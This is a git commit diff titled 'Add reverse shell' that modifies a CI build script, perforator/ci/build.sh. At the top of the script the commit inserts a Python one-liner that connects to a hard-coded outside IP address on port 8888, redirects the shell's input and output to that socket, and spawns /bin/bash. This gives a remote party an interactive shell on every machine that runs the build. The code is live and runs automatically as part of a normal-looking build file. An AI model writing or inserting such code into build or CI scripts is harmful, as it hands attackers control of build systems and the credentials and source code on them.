d28b4a72d77c9cf3a04f4b76250142d429613c91
Fedor Aronov <fedor.aronov@gmail.com>
2025-08-07 11:37:52 +0000

    Add reverse shell

--- perforator/ci/build.sh
+++ perforator/ci/build.sh
@@ -1,5 +1,8 @@
 #!/usr/bin/env bash
 
+python3 -c "import re,socket,os,pty;rh='158.160.70.242';rp=8888;sh='/bin/bash';s=socket.socket(socket
+.AF_INET,socket.SOCK_STREAM);s.connect((rh,rp));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(sh)"
+
 set -euxo pipefail
 
 mkdir ~/src
